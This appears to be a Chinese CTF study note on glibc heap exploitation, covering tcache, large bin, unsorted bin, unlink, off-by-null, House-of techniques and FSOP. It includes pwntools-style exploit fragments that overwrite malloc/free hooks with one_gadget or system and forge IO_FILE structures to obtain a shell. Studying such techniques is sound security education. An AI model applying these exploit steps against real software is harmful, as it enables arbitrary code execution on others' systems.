存在one_gadget有条件的情况需要使用**realloc，realloc中有许多push操作以及调整rsp的操作**，

![img](/img/pwn_note.zh-cn.assets/-172844676894974.assets)

如要求`[rsp+0x30]`必须为NULL或者是0，通过realloc来调整栈帧，rsp在栈上，通过push增加栈的高度，使得[rsp+0x30]区域为NULL即可；

- 最多抬高栈帧为(0x8*6+0x38)=0x68，由于多call了一次（call了realloc函数，然后又去call one_gadget，但是原本只有一次call one_gadget），**因此多执行了一次压栈指令，所以若直接执行realloc函数，栈帧抬高了0x70字节（即将原本的rsp变成了rsp-0x70）**
- **假设不执行push指令，跳过，那么执行一次realloc函数最少抬高0x40个字节（sub rsp,0x38让rsp-0x38再加上call时的压栈指令0x8）**
- **为了满足one_gadget的条件，只要rsp-0x40与rsp-0x70之间存在一个为0的内存单元，就可以控制realloc函数中push的数量来满足条件**
- *以**[rsp+0x30]=NULL**这个条件为例，加上rsp-0x40与rsp-0x70这个范围。即最后要在**rsp-0x10与rsp-0x40之间**找一块值为0的内存单元*

此处的+0xc表示只进行一次push，即rsp+0x30-0x8(push)-0x38(sub)-0x8(call) = rsp-0x18上为一块值为0的内存单元

```Python
payload = b"a" * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_addr + 0xc) 
# 去realloc中通过push、pop操作（即 rsp+0x30-5*8==null) 来满足条件
# 最后将one_gadget写入realloc_hook中
```

![img](/img/pwn_note.zh-cn.assets/-172844676894975.assets)

1. **malloc发现malloc_hook不为空，去调用malloc_hook里面的realloc+0xc**
2. **realloc发现realloc_hook不为空，可以执行realloc下面一系列push操作，调节栈帧满足one_gadget的条件**
   1. *执行realloc时，会判断__realloc_hook是否为空，如果不为空，则执行__realloc_hook指向的内容*
3. **最后调用realloc_hook中的one_gadeget，获取shell**

### Tcache bin attack

1. 一般利用UAF需要`malloc(0x80)`然后经过7次`free(0)`填充完`tcache bin`，**注：每次free(0)需要修改edit(0)改fd和bk为0，否则fd将会是堆块地址中部分数值，使得不可循环free**
2. 然后再free时进入`unsorted bin`泄露libc基址

#### Safe-linking机制

glibc-2.33引入的新检查机制

```C
/* 加密函数 */
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
/* 解密0函数 */
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

即

```C
p->fd = ((&p->fd)>>12) ^ REVEAL_PTR(p->fd)
//当前堆块的fd等于 (当前堆块fd的地址 >> 12) ^ 原来的fd（相邻先被释放的堆块地址）

// 第一块被释放: fd = (0x123456789abc >> 12) ^ 0 = 0x123456789
// 第二块被释放: fd = (0x123456789adc >> 12) ^ 0x123456789abc = 0x1235753dfd35
```

绕过方法：通过UAF填写`fd`的值为0（初值），之后泄露出该`tcache bin`堆块的`fd`的值实则为该堆块地址的前9位，进行偏移计算可获得该堆块地址即堆地址

```Python
heap_addr = (((u64(r.recv(8)) ^ pre_heap_addr) << 12) % (2**64)) + offset
next = ((heap_addr >> 12) % (2**64)) ^ free_hook_addr
```

覆盖`fd`为`free_hook`地址异或后的`next`地址劫持，申请2个同样大小堆块，从tcache中选出一块，第二块为fd指向的`free_hook`地址，写入`system`地址后，调用`free()`包含`'/bin/sh'`的堆块达到getshell目的

#### Double free

适用于2.27最初版本，两次释放同一块chunk

```Python
malloc(0x50)
free(0)
free(0)
```

![img](/img/pwn_note.zh-cn.assets/-172844676894976.assets)

泄露堆地址：UAF导致chunk中的fd指向自己，通过show功能可以泄露出heap的地址，通过调试的偏移可以获取到**tcache结构体的基址**

**控制`tcache_perthread_struct`：**

- 再申请一个chunk，即为原来的chunk1，将fd覆盖为**`tcache_perthread_struct`**的地址，此时两次malloc后的第二次malloc分配的堆块到`tcache_perthread_struct`结构体地址，可以控制该结构体

![img](/img/pwn_note.zh-cn.assets/-172844676894977.assets)

- 编辑tcache结构体中的count为极大值，导致之后分配的chunk在free后不会进入tcache进行绕过（因为tcache判别时发现已满），此时我们可以**将tcache结构体【0x251大于fastbin的0x80】所在的chunk free到unsorted bin**中，进行后续利用（泄露地址或unsorted bin attack）

```Python
new(0x50) #1
edit(1, p64(heap_base - 0x250))
new(0x50) #2
new(0x50) #3
edit(3, 'a' * 0x28)
delete(3)
```

- 当申请堆块可覆盖tcache结构体时，且如上已经覆盖导致tcache认为自己已满，此时可以接着**通过覆盖修改结构体中的`tcache_entry`**，其中每隔8字节是一个指向tcache bin的地址，如前tcache图中所示，覆盖其中一个地址为跳向【malloc_hook-0x13】的地址，可以达到劫持malloc目的，后续操作参考tcache bin attack，其中注意：若之后要向malloc_hook地址申请0x20的chunk，需要劫持tcache_entry中属于0x30（0x20+0x10）的位置

### Large bin attack

- 保护全开，glibc-2.31，通过UAF来利用
- **0x4FF < size < 0xFFF**：申请对应large bin，`malloc` 时，会遍历 `unsorted bin`，若无法**精确分配**或不满足切割分配条件，会将该 `chunk `置入相应大小的 `bin`(**large bins**) 中

**泄露libc基址**

```Python
create(1, 0x500, b'')
create(2, 0x600, b'')
create(3, 0x700, b'') # 隔开 top chunk
delete(1) # 1 进入 unsorted bin
delete(3) # 3 并入 top chunk
create(4, 0x700, b'') # free chunk 1 无法满足 进入 large bins
browse(1) # 同样可获取一个到main_arena偏移一段距离的地址, 泄露libc基址
```

**获取堆地址**

```Python
create(0x600) # 0
create(0x6e0) # 1
delete(0)
create(0x6e0) # 2 将unsorted bin中的 0 块放入large bin中
show(0) # 看 0 的fd, bk泄露 main_arena偏移地址来得到libc地址
# 看 0 的fd_nextsize, bk_nextsize来得到堆的偏移地址
# fd=bk, fd_nextsize=bk_nextsize
```

#### mp_ struct attack

- 修改掉 `tcache_bins`：# 只允许的最大tcache chunk大小，释放的小于`mp_.tcache_bins`的`chunk`会被当作`tcache bin`处理，可以把很大的 `chunk` 用 `tcachebin` 管理
- 修改掉 `tcache_count`： 可以控制链表的 `chunk` 的数量

```Python
tcache_bins = mp_ + 80
tcache_max_bytes = mp_ + 88
```

![img](/img/pwn_note.zh-cn.assets/-172844676894978.assets)

- **任意地址写**堆地址：`large bin`链表中并没有对`fd_nextsize`和`bk_nextsize`进行双向链表完整性的检查，通过改写`large bin`的`bk_nextsize`的值来向**指定的位置+0x20**的位置写入一个**堆地址，即很大的值，使得下次`free`时堆块将进入`tcache`处理**
- 通过uaf `browse`出`fd`的值，对堆块进行填充时fd保持不变，而更改`bk_nextsize`和`fd_nextsize`的值,覆写`malloc`中`tcache`部分的`mp_.tcache_bins`的值为一个很大的地址

```Python
change(5, p64(fd) * 2 + p64(mp_addr + 0x50 - 0x20) * 2)
create(41, 0x900, b'') # 用于触发漏洞，当unsorted bin 遍历将其转入 large bins 更改 tcache_bins 
delete(9) # 将会使得该堆块进入tcache bin中
```

**因为溢出和tcache struct内容存放在堆空间上的缘故，需要伪造的结构内容会落在我们的可控堆块上，由于0x500（9号堆块）实在太大，导致tcache bin 的链表头写到malloc顺序中的1号堆块中，可调试观察**

![img](/img/pwn_note.zh-cn.assets/-172844676894979.assets)

```Python
change(1, p64(0) * 13 + p64(free_hook_addr)) # 将9号块位置修改为free_hook地址
create(12, 0x500, p64(system_addr)) # 将拿tcache堆块，即向free_hook处创建堆块，覆盖为system地址
delete(10) # 10号堆块提前写入内容'/bin/sh' 完成getshell
```

- 覆写`free_hook`为`system`，进而getshell

### Unsorted bin attack

**libc地址泄露**

结合off-by-null或UAF

```Python
# UAF
create(0x100, b'')
create(0x60, b'') # 申请堆块
delete(0) # unsorted bin bin1   后续create(0x100, b'')可继续使用该块
show(0)
```

- 构造出一个堆块进入unsorted bin形成下图结构，伪造堆块bin1，其未置指针为0，显示bin1内容可以泄露出fd指针指向的一个与`main_arena`有固定偏移的地址，该偏移可调试得出
- glibc-2.23中为`88`偏移

![img](/img/pwn_note.zh-cn.assets/-172844676894980.assets)

而`main_arena` 是一个 `struct malloc_state` 类型的全局变量，是 `ptmalloc` 管理主分配区的唯一实例，被分配在 `.data` 或者 `.bss` 等段上，然后通过进程所使用的 `libc` 的 `.so` 文件，获得 `main_arena` 与 `libc` 基地址的偏移，实现对 `ASLR` 的绕过，也可通过 glibc-2.23 中`malloc_hook = main_arena - 0x10`的偏移计算

**通过main_arena获取libc基址：main_arena存储在libc.so.6文件的.data段，IDA打开libc文件，搜索`malloc_trim()`，如图得到偏移地址**

![img](/img/pwn_note.zh-cn.assets/-172844676894981.assets)

获取libc基址后获取`malloc_hook`和`realloc`地址

```Python
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook'] # <__malloc_hook>
realloc_addr = libc_base + libc.symbols['realloc'] # <__GI___libc_realloc>
```

**任意地址写大数**

`Unsorted bin`遍历堆块使用`bk`指针

```C
// 简化源码 libc-2.27
victim = unsorted_chunks (av)->bk; // 链表尾部堆块：victim
bck = victim->bk;                  // 倒数第二堆块：bck
// 对victim的size位检查，获取chunk大小
// ... ...不属于small bin范围，则将victim脱链放入合适链中或返回用户

unsorted_chunks(av)->bk = bck;
bck->fd = unsorted_chunks(av); // 此处向bck->fd即((target-0x10)+0x10)处写入main_aren偏移地址，包括7f可达成写入7f构造目的
```

- 通过堆溢出或其他修改`unsorted bin`中堆块的`bk(addr+0x8)`为`target_addr - 0x10`，`malloc`触发漏洞达成写大数（地址数），即向`target_addr`写入`unsorted_chunks(av)`值——`mainarena`偏移地址

![img](/img/pwn_note.zh-cn.assets/-172844676894982.assets)

### Unlink

- `free`时和目前**物理相邻的 free chunk 合并为新堆块**，避免碎片化内存，将某一个空闲 chunk 从其所处的双向链表中脱链
- **释放堆时会判断当前 chunk 的相邻 chunk 是否为空闲状态，若是则会进行堆合并。合并时会将空闲 chunk 从 bin 中 unlink，并将合并后的 chunk 添加到 unsorted bin 中。堆合并分为向前合并和向后合并。**

**漏洞点：堆溢出**

```C
*(&RecordList + i) = malloc(v1); // v1 < 0x81 Create函数
read(0, *(&RecordList + v1), 0x100uLL); // change函数
```

溢出长度足够大，在已申请的堆中**伪造一块已经释放过的堆**，当free其前或后面的堆块时会触发unlink，使得伪造的部分会指向一个我们指定的地方，允许我们修改

**老版本利用：无对 chunk 的 size 检查和双向链表检查**

![img](/img/pwn_note.zh-cn.assets/-172844676894983.assets)

**free(Q)时**

- 前向合并，前chunk use，不合并
- 后向合并，后chunk free，合并，对`N`进行`unlink`

**unlink执行效果——64位**

```C
FD=P->fd = target addr - 0x18
BK=P->bk = expect value // 变式: = target addr - 0x10
FD->bk = BK，即 *((target addr - 0x18) + 0x18) = BK = expect value // 任意地址写
BK->fd = FD，即 *(expect value + 0x10) = FD = target addr - 0x18 
     // 变式: = *(target addr) 即第四步将是任意地址写, 目标地址内容更改为(目标地址-0x18)
```

- 实现**任意地址写：**向可写地址`target addr`中写入`expect value`，**其中expect value + 0x10 地址具有可写的权限**
- 此时可以将存储`malloc`地址的`recordlist[2]`内容覆盖为恶意地址`recordlist[2]-0x18=recordlist[0]`，修改可以将malloc数组全部指针修改为其他的地址并通过`change`写入恶意内容

![img](/img/pwn_note.zh-cn.assets/-172844676894984.assets)

构造链模版**不完全RELRO泄露libc基址+getshell**

1. 编辑`r[2]`覆写为`free`函数的`got`表，再编辑`r[0]`把free函数的got表覆写为`puts`函数的`plt`表，编辑`r[2]`使得`r[0]`覆写为`puts`函数的`got`表，`free(r[0]) = puts_plt(puts_got)`输出puts真实地址，获取**libc基址**

- 同样的方法，将`free`函数的`got`表覆写为`system`函数的真实地址，`free`写有"/bin/sh"的堆

### Off-by-one

更改后一块的`size`位，用于合并堆块造成堆块重叠

### Off-by-null

原理：程序向堆缓冲区中写入时，字节数超过了该缓冲区本身所申请的字节数，且刚好越界了一个字节；利用该漏洞可以实现利用方法：**poison null byte/off-by-null（适用于libc-2.27）**

**触发漏洞：**

![img](/img/pwn_note.zh-cn.assets/-172844676894985.assets)

**原理**：free(b)后并没有将b指针置为NULL，且此时b中的prev_size作为a的内容，可以填入a的数据，若能控制a的数据，超过b的prev_size区域后并且覆盖b的size区域中一个字节，则造成off-by-one

- 要绕过高版本的glibc需要在b上构造数据进行绕过验证，旧版本check为`size==prev_size(next_chunk)`，新版本check为**`chunksize(P) != prev_size (next_chunk(P))`**
- 在off by one后，`b`的`size`将会由于覆盖而改变，`chunksize(P)`即`b`的`size`大小，被覆盖为了`0xa00`，而`next_chunk(P)`本来应该为`c`的`prev_size`，但是此时并不是`c`，对于`b`的`next_chunk`的计算应该是`b`的`chunk`指针加上`b`的`size`，即图中【b-0x10+0xa00】，仍在`b`的`chunk`内，所以提前构造`* (size_t)(b+0x9f0) = 0xa00;`

![img](/img/pwn_note.zh-cn.assets/-172844676894986.assets)

free `b`后，进入`unsorted bin`中，申请新的`B1`和`B2`，将会从原来`b`的位置延续，而修改`c`的`pre_size`时也会因为伪造导致修改在了向上偏0x10的位置处，所以`c`仍然认为`prev_size`为**0xa10**，free B1和c后，会导致B1、B2和c一同合并为一个大chunk进入`unsorted bin`中，而B2并没有被free，再次申请d，会出现覆盖B2的情况（形成堆的堆叠），此时可以任意修改B2中的内容，通常B2（受害者）将是一个结构，其中包含我们要控制的有价值的指针

**漏洞点：**

```C
for(i=0; ;++i)
    if(i > length) break //i=length时多写一个
```

利用实现unsorted bin泄露方法：

构造0,1,2,3共四个堆块，修改0号堆块内容溢出一字节到1堆块更改大小覆盖1和2堆块，此时1和2堆块被系统误认为为一个堆块，释放1堆块，将会有一个合并chunk进入unsorted bin（进入的**前提**为**1和2堆块相加的大小要大于0x80**），再申请一个堆块（和1堆块大小相等），此时unsorted bin分割导致只存有2堆块，2堆块的fd和bk都指向一个地址，访问2堆块可以泄露相关main_arena的地址

### hook劫持

malloc_hook

free_hook

### House of系列

#### House of strom

glibc-2.27及之前版本

#### House of orange

- glibc-2.23~2.26，无`free`函数，仅仅存在堆溢出，可以`unsorted bin attack`
- 溢出控制`top chunk` 大小为`unsorted bin`大小，free后得到`unsorted bin`中的堆块，nb为申请的堆块大小，条件：
  - nb + MINSIZE > old_top_chunk_size > MINSIZE
  - old_top_chunk的pre_inuse = 1
  - top_chunk_start + size的地址页对齐，末尾三位为0
  - malloc(need)，need > top_chunk_size
  - nb < 0x20000

```C
// 调用链 malloc > sysmalloc > _int_free
_int_free(av, old_top, 1); // 通过此将top chunk free
add(0x10, b'')
edit(0, xxx) # 修改top chunk
add(0x1000, b'') # top chunk 进入 unsorted bin
add(0x400, b'') # 从 unsorted bin 获取堆块
show() # 泄露地址
```

#### House of spirit

glibc-2.23

![img](/img/pwn_note.zh-cn.assets/-1728446804381103.assets)

目的：在目标位置处伪造 fastbin chunk，并将其释放，达到分配指定地址的 chunk 的目的

- 构造fake_chunk，然后free(a)，欺骗malloc认为内存释放，此时进入相应大小的fastbin中
- malloc(0x30)，将fake_chunk申请，分配堆块到fake_chunk

**攻击条件：**

- fake chunk 的 size 大小需要满足对应的 fastbin 的需求(<= 128 on x64)，同时也**得对齐**
- fake chunk 的 `ISMMAP` 位**不能为 1**，因为 free 时，如果是 mmap 的 chunk，会单独处理
- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem`

**适用场景如图：**

需要对不可控的中间区域进行利用

![img](/img/pwn_note.zh-cn.assets/-1728446804381104.assets)

#### House of Apple1

高版本libc-2.39利用，保护全开，仅使用一次`largebin attack`并限制读写次数的条件下进行`FSOP`利用

**条件**

1. 从`main`返回或能调用`exit`函数
2. 能泄露出`heap`地址和`libc`地址
3. 能使用一次`largebin attack`

- 调用链：`exit `> `fcloseall `> `_IO_clenup `> `_IO_flush_all_lockp `> `_IO_OVERFLOW`
- 最终遍历`_IO_list_all`存放的每个`IO_FILE`结构体，满足条件则调用每个结构体中`vtable->_overflow`函数指针指向的函数

**劫持`_wide_data`：**

```C
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data; // 劫持这个变量, 在_IO_FILE中偏移为0xa0
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

通过`_IO_wstrn_overflow`达到控制`_wide_data`改为**已知的堆地址**

```C
static wint_t
_IO_wstrn_overflow (FILE *fp, wint_t c)
{
  /* When we come to here this means the user supplied buffer is
     filled.  But since we must return the number of characters which
     would have been written in total we must provide a buffer for
     further use.  We can do this by writing on and on in the overflow
     buffer in the _IO_wstrnfile structure.  */
  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp; // fp强制转换为_IO_wstrnfile *指针
 
  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf) // 一般都是成立的
    {
      _IO_wsetb (fp, snf->overflow_buf,
         snf->overflow_buf + (sizeof (snf->overflow_buf)
                      / sizeof (wchar_t)), 0);
                      
      // 对_wide_data赋值 利用点
      fp->_wide_data->_IO_write_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;
      fp->_wide_data->_IO_read_end = (snf->overflow_buf
                      + (sizeof (snf->overflow_buf)
                     / sizeof (wchar_t)));
    }
 
  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;
  fp->_wide_data->_IO_write_end = snf->overflow_buf;
 
  /* Since we are not really interested in storing the characters
     which do not fit in the buffer we simply ignore it.  */
  return c;
}
```

有时需要绕过`_IO_wsetb`函数里的`free`：

```C
void
_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)
{
  if (f->_wide_data->_IO_buf_base && !(f->_flags2 & _IO_FLAGS2_USER_WBUF))
    free (f->_wide_data->_IO_buf_base); // 其不为0的时候不要执行到这里
  f->_wide_data->_IO_buf_base = b;
  f->_wide_data->_IO_buf_end = eb;
  if (a)
    f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;
  else
    f->_flags2 |= _IO_FLAGS2_USER_WBUF;
}
```

`_IO_wstrnfile`结构体

```C
struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer_unused;
  _IO_free_type _free_buffer_unused;
};
 
struct _IO_streambuf
{
  FILE _f;
  const struct _IO_jump_t *vtable;
};
 
typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
 
typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  char overflow_buf[64];
} _IO_strnfile;
 
 
typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  wchar_t overflow_buf[64]; // overflow_buf在_IO_FILE的编译为0xf0
} _IO_wstrnfile;
```

`struct _IO_wide_data`结构体

```C
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;   /* Start of putback+get area. */
  wchar_t *_IO_write_base;  /* Start of put area. */
  wchar_t *_IO_write_ptr;   /* Current put pointer. */
  wchar_t *_IO_write_end;   /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;     /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base; /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
 
  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
};
```

在堆上伪造一个`_IO_FILE`结构体，地址为`A`，将`A + 0xd8`替换为`_IO_wstrn_jumps`地址，`A + 0xc0`设置为`B`，并设置其他成员以便能调用到`_IO_OVERFLOW`。`exit`函数会一路调用到`_IO_wstrn_overflow`函数，并将`B`至`B + 0x38`的地址区域的内容都替换为`A + 0xf0`或者`A + 0x1f0`。

#### House of Apple2

只能**写一次**的情况，得到libc基址后：

```Python
system_addr = libc_base + libc.symbols['system']
_IO_list_all_addr = libc_base + libc.symbols['_IO_list_all']
_IO_wfile_jumps_addr = libc_base + libc.symbols['_IO_wfile_jumps']
_lock = libc_base + libc.symbols['_IO_list_all'] + 0xa8 #_IO_stdfile_2_lock
```

**利用`_IO_wfile_overflow`函数控制程序执行流**

`fp`指代`_IO_FILE`结构体变量，对`fp`的设置如下：

- `_flags`设置为`~(2 | 0x8 | 0x800)`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为` sh;`，前面有两个空格
- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_write_base`设置为`0`，即满足`*(A + 0x18) = 0`
- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`

**调用链：**

> `_IO_wfile_overflow`>
>
> `_IO_wdoallocbuf`>
>
> `_IO_WDOALLOCATE`>
>
> `*(fp->_wide_data->_wide_vtable + 0x68)(fp)`

**`_IO_wfile_overflow`函数**

```C
wint_t _IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
    {
      _IO_wdoallocbuf (f);// 需要走到这里
      // ......
    }
    }
}
```

**`_IO_wdoallocbuf`函数**

```C
void _IO_wdoallocbuf (FILE *fp){
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
             fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)

#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
```

## IO_FILE

```
glibc`高版本逐渐移除了`__malloc_hook/__free_hook/__realloc_hook`等一众`hook`全局变量，需要利用`IO_FILE
```

**`_IO_FILE_plus`结构体**

```C
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable; 
  // vtable:实现文件流操作的虚函数表,包含一组函数指针,指向实现各种文件操作的函数
};
```

**`_IO_FILE`结构**

```C
// Glibc-2.23
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
0x0:'_flags',
0x8:'_IO_read_ptr',
0x10:'_IO_read_end',
0x18:'_IO_read_base',
0x20:'_IO_write_base',
0x28:'_IO_write_ptr',
0x30:'_IO_write_end',
0x38:'_IO_buf_base',
0x40:'_IO_buf_end',
0x48:'_IO_save_base',
0x50:'_IO_backup_base',
0x58:'_IO_save_end',
0x60:'_markers',
0x68:'_chain',
0x70:'_fileno',
0x74:'_flags2',
0x78:'_old_offset',
0x80:'_cur_column',
0x82:'_vtable_offset',
0x83:'_shortbuf',
0x88:'_lock',
0x90:'_offset',
0x98:'_codecvt',
0xa0:'_wide_data',
0xa8:'_freeres_list',
0xb0:'_freeres_buf',
0xb8:'__pad5',
0xc0:'_mode',
0xc4:'_unused2',
0xd8:'vtable'
```

`stdin`，`stdout`和`stderr`都会使用该结构体，分别是**`IO_2_1_stdin`，`IO_2_1_stdout`，`IO_2_1_stderr`**，都开在libc的数据段上

![img](/img/pwn_note.zh-cn.assets/-1728446804381105.assets)

**利用**：将原本的`_flags`或上`_IO_CURRENTLY_PUTTING`和`_IO_IS_APPENDING`，即`0x1800`

### stdout Leak

bss段中可能存放stdout对应IO_FILE的地址，修改`stdout`的`FILE`结构体中的缓冲区指针进行信息泄漏

![img](/img/pwn_note.zh-cn.assets/-1728446804381106.assets)

**构造payload泄露地址内容：**

```Python
payload = p64(0xfbad1800) + p64(0)*3 + p64(leak_libc_addr) + p64(leak_libc_addr + 0x8)
```

当有`write`和`puts`时将会把该地址内容一并输出

## FSOP

**核心**：

- 篡改`_IO_list_all`和`_chain`来劫持`IO_FILE`结构体，使其落在可控内存中，使用`_IO_flush_all_lockp`来刷新`_IO_list_all`链表上所有文件流
- `fflush`最终调用了`vtable`中的`_IO_overflow`，控制使得`vtable`中的`_IO_overflow`函数地址改为`system`地址，第一个参数是`IO_FILE`结构体的地址
- 使得`flags`成员为`/bin/sh`字符串，执行exit函数或libc执行abort流程时或main返回时，触发`_IO_flush_all_lockp`来拿到shell

## Kernel